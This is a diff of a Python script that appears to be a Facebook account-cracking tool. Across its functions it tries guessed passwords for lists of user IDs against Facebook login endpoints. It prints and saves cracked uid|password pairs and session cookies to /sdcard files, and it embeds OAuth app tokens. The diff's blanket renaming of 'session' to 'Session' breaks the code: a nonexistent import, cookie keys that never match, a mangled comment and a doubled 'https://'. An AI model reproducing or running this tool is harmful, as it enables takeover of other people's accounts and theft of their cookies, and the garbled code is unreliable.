@@ -26,7 +26,7 @@ import requests,certifi
 from requests.exceptions import ConnectionError
 from requests import api
 from requests import models
-from requests import sessions  
+from requests import Sessions  
 from bs4 import BeautifulSoup as sop
 from concurrent.futures import ThreadPoolExecutor as tred
 import os,sys,time,json,random,re,string,platform,base64,platform,uuid
@@ -830,7 +830,7 @@ ipz=generate_unlimited_ips()
 def get_current_location():
     try:
         response = requests.get('https://ipinfo.io/json')
-        response.raise_for_status()  # Raise an HTTPError for bad responses
+        response.raise_for_status()  # Raise an HTTPError for bad responSession
         data = response.json()
         city = data.get('city', 'Unknown')
         country = data.get('country', 'Unknown')
@@ -1510,9 +1510,9 @@ def freefb(uid, name, pwx, tl):
             last = first
         for ps in pwx:
             pw = ps.replace("first", first).replace("last", last).lower()
-            session = requests.Session()
+            Session = requests.Session()
             ua = random.choice(SUMONua)
-            free_fb = session.get("https://m.facebook.com").text
+            free_fb = Session.get("https://m.facebook.com").text
             data = {
                 "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                 "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -1554,10 +1554,10 @@ def freefb(uid, name, pwx, tl):
             'sec-fetch-dest': 'document',
             'accept-encoding': 'gzip, deflate, br, zstd',
             'accept-language': 'en-US,en;q=0.9',}
-            lo = session.post("https://mbasic.facebook.com/login/Device-based/password/?uid=100095733750131&flow=login_no_pin&refsrc=deprecated&_rdr", data=data, headers=headers).text
-            log_cookies = session.cookies.get_dict().keys()
+            lo = Session.post("https://mbasic.facebook.com/login/Device-based/password/?uid=100095733750131&flow=login_no_pin&refsrc=deprecated&_rdr", data=data, headers=headers).text
+            log_cookies = Session.cookies.get_dict().keys()
             if "c_user" in log_cookies:
-                coki = ";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 print(f" {green}[SUMON-OK] {uid}|{pw}")
                 print(f" {white}[COOKIES] {green}{coki}")
                 open("/sdcard/SUMON_file_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
@@ -1612,7 +1612,7 @@ def bapi(uid, name, pwx, tl):
                 'source': 'login',
                 'error_detail_type': 'button_with_disabled',
                 'enroll_misauth': 'false',
-                'generate_session_cookies': '1',
+                'generate_Session_cookies': '1',
                 'generate_machine_id': '1',
                 'currently_logged_in_userid': '0',
                 'locale': 'en_GB',
@@ -1633,7 +1633,7 @@ def bapi(uid, name, pwx, tl):
                 'Authorization': 'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895', 
                 'X-FB-Connection-Type': 'WIFI',
                 'X-Tigon-Is-Retry': 'False',
-                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
+                'x-fb-Session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                 'x-fb-Device-group': '5120',
                 'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                 'X-FB-Request-Analytics-Tags': 'graphservice',
@@ -1644,8 +1644,8 @@ def bapi(uid, name, pwx, tl):
             }
             url = "https://b-api.facebook.com/auth/login"
             result = requests.post(url, data=data, headers=headers).json()
-            if "session_key" in result:
-                coki = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
+            if "Session_key" in result:
+                coki = ";".join(i["name"]+"="+i["value"] for i in result["Session_cookies"])
                 print(f" {green}[SUMON-OK] {uid}|{pw}")
                 print(f" {white}[COOKIES] {green}{coki}")
                 open("/sdcard/SUMON_file_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
@@ -1694,7 +1694,7 @@ def graph(uid, name, pwx, tl):
                 'source': 'login',
                 'error_detail_type': 'button_with_disabled',
                 'enroll_misauth': 'false',
-                'generate_session_cookies': '1',
+                'generate_Session_cookies': '1',
                 'generate_machine_id': '1',
                 'currently_logged_in_userid': '0',
                 'locale': 'en_GB',
@@ -1715,7 +1715,7 @@ def graph(uid, name, pwx, tl):
                 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                 'X-FB-Connection-Type': 'WIFI',
                 'X-Tigon-Is-Retry': 'False',
-                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
+                'x-fb-Session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                 'X-FB-Device-group': str(random.randint(2000, 4000)),
                 'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                 'X-FB-Request-Analytics-Tags': 'graphservice',
@@ -1726,8 +1726,8 @@ def graph(uid, name, pwx, tl):
             }
             url = "https://b-graph.facebook.com/auth/login"
             result = requests.post(url, data=data, headers=headers).json()
-            if "session_key" in result:
-                coki = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
+            if "Session_key" in result:
+                coki = ";".join(i["name"]+"="+i["value"] for i in result["Session_cookies"])
                 print(f" {green}[SUMON-OK] {uid}|{pw}")
                 print(f" {white}[COOKIES] {green}{coki}")
                 open("/sdcard/SUMON_file_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
@@ -1758,8 +1758,8 @@ def mbasic(uid,pwx,tl):
         for pw in pwx:
             ua = random.choice(uas)
             pro = random.choice(SUMONua)
-            ses = requests.Session()
-            free_fb = ses.get('https://m.facebook.com').text
+            Session = requests.Session()
+            free_fb = Session.get('https://m.facebook.com').text
             data = {
             "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -1789,12 +1789,12 @@ def mbasic(uid,pwx,tl):
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = "https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
-            po = ses.post(url, data=data, headers=headers).text
-            response = ses.cookies.get_dict().keys()
+            po = Session.post(url, data=data, headers=headers).text
+            response = Session.cookies.get_dict().keys()
             if "c_user" in response:
-                cok = ses.cookies.get_dict()
+                cok = Session.cookies.get_dict()
                 cid = cok["c_user"]
-                coki = ";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
+                coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 check = check_lock(cid)
                 if "live" in check:
                     if '%3A-1%3A-1' in coki:
@@ -1815,7 +1815,7 @@ def mbasic(uid,pwx,tl):
                 else:
                     break
             elif 'checkpoint' in response:
-                coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
+                coki=";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 uid = "1000"+coki1[0:11]
                 print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
                 open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
@@ -1842,8 +1842,8 @@ def p(uid,pwx,tl):
         for pw in pwx:
             ua = random.choice(uas)
             pro = random.choice(SUMONua)
-            ses = requests.Session()
-            free_fb = ses.get('https://m.facebook.com').text
+            Session = requests.Session()
+            free_fb = Session.get('https://m.facebook.com').text
             data = {
             'm_ts': '',
             'li': '',
@@ -1887,12 +1887,12 @@ def p(uid,pwx,tl):
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = "https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
-            po = ses.post(url, data=data, headers=headers).text
-            response = ses.cookies.get_dict().keys()
+            po = Session.post(url, data=data, headers=headers).text
+            response = Session.cookies.get_dict().keys()
             if "c_user" in response:
-                cok = ses.cookies.get_dict()
+                cok = Session.cookies.get_dict()
                 cid = cok["c_user"]
-                coki = ";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
+                coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 check = check_lock(cid)
                 if "live" in check:
                     if '%3A-1%3A-1' in coki:
@@ -1913,7 +1913,7 @@ def p(uid,pwx,tl):
                 else:
                     break
             elif 'checkpoint' in response:
-                coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
+                coki=";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 uid = "1000"+coki1[0:11]
                 print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
                 open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
@@ -1941,8 +1941,8 @@ def x(uid,pwx,tl):
         for pw in pwx:
             ua = random.choice(uas)
             pro = random.choice(SUMONua)
-            ses = requests.Session()
-            free_fb = ses.get('https://m.facebook.com').text
+            Session = requests.Session()
+            free_fb = Session.get('https://m.facebook.com').text
             data = {
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             'jazoest': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
@@ -1970,12 +1970,12 @@ def x(uid,pwx,tl):
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = "https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
-            po = ses.post(url, data=data, headers=headers).text
-            response = ses.cookies.get_dict().keys()
+            po = Session.post(url, data=data, headers=headers).text
+            response = Session.cookies.get_dict().keys()
             if "c_user" in response:
-                cok = ses.cookies.get_dict()
+                cok = Session.cookies.get_dict()
                 cid = cok["c_user"]
-                coki = ";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
+                coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 check = check_lock(cid)
                 if "live" in check:
                     if '%3A-1%3A-1' in coki:
@@ -1996,7 +1996,7 @@ def x(uid,pwx,tl):
                 else:
                     break
             elif 'checkpoint' in response:
-                coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
+                coki=";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 uid = "1000"+coki1[0:11]
                 print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
                 open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
@@ -2026,8 +2026,8 @@ def mobile(uid,pwx,tl):
             pro = random.choice(SUMONua)
             time_now = int(datetime.now().timestamp())
             enc_password = f"#PWD_BROWSER:0:{time_now}:{pw}"
-            ses = requests.Session()
-            free_fb = ses.get('https://m.facebook.com').text
+            Session = requests.Session()
+            free_fb = Session.get('https://m.facebook.com').text
             data = {
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
@@ -2064,12 +2064,12 @@ def mobile(uid,pwx,tl):
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = "https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
-            po = ses.post(url, data=data, headers=headers).text
-            response = ses.cookies.get_dict().keys()
+            po = Session.post(url, data=data, headers=headers).text
+            response = Session.cookies.get_dict().keys()
             if "c_user" in response:
-                cok = ses.cookies.get_dict()
+                cok = Session.cookies.get_dict()
                 cid = cok["c_user"]
-                coki = ";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
+                coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 check = check_lock(cid)
                 if "live" in check:
                     if '%3A-1%3A-1' in coki:
@@ -2090,7 +2090,7 @@ def mobile(uid,pwx,tl):
                 else:
                     break
             elif 'checkpoint' in response:
-                coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
+                coki=";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 uid = "1000"+coki1[0:11]
                 print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
                 open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
@@ -2119,8 +2119,8 @@ def freeq(uid,pwx,tl):
         for pw in pwx:
             ua = random.choice(uas)
             pro = random.choice(SUMONua)
-            ses = requests.Session()
-            free_fb = ses.get('https://m.facebook.com').text
+            Session = requests.Session()
+            free_fb = Session.get('https://m.facebook.com').text
             data ={
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -2161,12 +2161,12 @@ def freeq(uid,pwx,tl):
             'accept-language': 'en-US,en;q=0.9',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = "https://https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
-            po = ses.post(url, data=data, headers=headers).text
-            response = ses.cookies.get_dict().keys()
+            po = Session.post(url, data=data, headers=headers).text
+            response = Session.cookies.get_dict().keys()
             if "c_user" in response:
-                cok = ses.cookies.get_dict()
+                cok = Session.cookies.get_dict()
                 cid = cok["c_user"]
-                coki = ";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
+                coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 check = check_lock(cid)
                 if "live" in check:
                     if '%3A-1%3A-1' in coki:
@@ -2187,7 +2187,7 @@ def freeq(uid,pwx,tl):
                 else:
                     break
             elif 'checkpoint' in response:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                coki=";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 cid = coki[141:156]
                 #print('\33[1;91m[DEV-CP] '+uid+' | '+pw+'\33[0;97m')
                 open('/sdcard/Dev-Cp.txt', 'a').write(uid+' | '+pw+'\n')
@@ -2215,8 +2215,8 @@ def d(uid,pwx,tl):
         for pw in pwx:
             ua = random.choice(uas)
             pro = random.choice(SUMONua)
-            ses = requests.Session()
-            free_fb = ses.get('https://m.facebook.com').text
+            Session = requests.Session()
+            free_fb = Session.get('https://m.facebook.com').text
             data = {
             "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
             "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
@@ -2255,12 +2255,12 @@ def d(uid,pwx,tl):
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = "https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
-            po = ses.post(url, data=data, headers=headers).text
-            response = ses.cookies.get_dict().keys()
+            po = Session.post(url, data=data, headers=headers).text
+            response = Session.cookies.get_dict().keys()
             if "c_user" in response:
-                cok = ses.cookies.get_dict()
+                cok = Session.cookies.get_dict()
                 cid = cok["c_user"]
-                coki = ";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
+                coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 check = check_lock(cid)
                 if "live" in check:
                     if '%3A-1%3A-1' in coki:
@@ -2281,7 +2281,7 @@ def d(uid,pwx,tl):
                 else:
                     break
             elif 'checkpoint' in response:
-                coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
+                coki=";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 uid = "1000"+coki1[0:11]
                 print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
                 open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
@@ -2498,8 +2498,8 @@ def cracker(uid, pwx, tl):
             ])
             ua = random.choice(uas)
             pro = random.choice(SUMONua)
-            ses = requests.Session()
-            p_fb = ses.get("https://m.facebook.com").text
+            Session = requests.Session()
+            p_fb = Session.get("https://m.facebook.com").text
             lsd = re.search('name="lsd" value="(.*?)"', str(p_fb)).group(1)
             jazoest = re.search('name="jazoest" value="(.*?)"', str(p_fb)).group(1)
             m_ts = re.search('name="m_ts" value="(.*?)"', str(p_fb)).group(1)
@@ -2547,12 +2547,12 @@ def cracker(uid, pwx, tl):
             'accept-language': 'en-US,en;q=0.9',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = "https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
-            po = ses.post(url, data=data, headers=headers).text
-            response = ses.cookies.get_dict().keys()
+            po = Session.post(url, data=data, headers=headers).text
+            response = Session.cookies.get_dict().keys()
             if "c_user" in response:
-                cok = ses.cookies.get_dict()
+                cok = Session.cookies.get_dict()
                 cid = cok["c_user"]
-                coki = ";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
+                coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 check = check_lock(cid)
                 if "live" in check:
                     if '%3A-1%3A-1' in coki:
@@ -2573,7 +2573,7 @@ def cracker(uid, pwx, tl):
                 else:
                     break
             elif 'checkpoint' in response:
-                coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
+                coki=";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 uid = "1000"+coki1[0:11]
                 print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
                 open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
